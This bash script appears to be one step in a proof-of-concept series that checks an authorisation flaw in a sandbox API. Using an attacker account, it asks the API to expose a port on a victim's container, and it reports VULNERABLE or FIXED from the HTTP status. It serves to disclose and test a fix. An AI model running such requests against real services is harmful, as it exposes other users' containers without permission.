#!/usr/bin/env bash
# 06 — Attacker exposes EXPOSE_PORT on the victim's container.
# Vulnerable: 200 {"status":"ok",...}
# Fixed:      404
set -euo pipefail
# shellcheck source=_lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_lib.sh"

banner "06  Attacker exposes port ${EXPOSE_PORT} on victim container"
require_state attacker.json
require_state victim-container-name

victim_container="$(cat "${STATE_DIR}/victim-container-name")"
path="/api/sandbox/containers/${victim_container}/expose"

body="$(api attacker POST "${path}" -d "$(jq -n --argjson p "${EXPOSE_PORT}" '{port: $p}')")"
print_http
echo "${body}" | jq . 2>/dev/null || echo "${body}"
echo "${body}" > "${STATE_DIR}/attacker-expose.json"

http="$(last_http)"
echo
echo "  POST ${path}  {\"port\": ${EXPOSE_PORT}}"

case "${http}" in
  200)
    verdict VULNERABLE "attacker exposed port ${EXPOSE_PORT} on ${victim_container}"
    echo "${EXPOSE_PORT}" > "${STATE_DIR}/exposed-port"
    ;;
  404)
    verdict FIXED "attacker could not expose a port on victim container (HTTP 404)"
    echo "${EXPOSE_PORT}" > "${STATE_DIR}/exposed-port"
    ;;
  *)
    verdict INCONCLUSIVE "unexpected HTTP ${http} exposing port on victim container"
    echo "${EXPOSE_PORT}" > "${STATE_DIR}/exposed-port"
    exit 1
    ;;
esac

echo
echo "Next: ./07-attacker-proxy.sh"
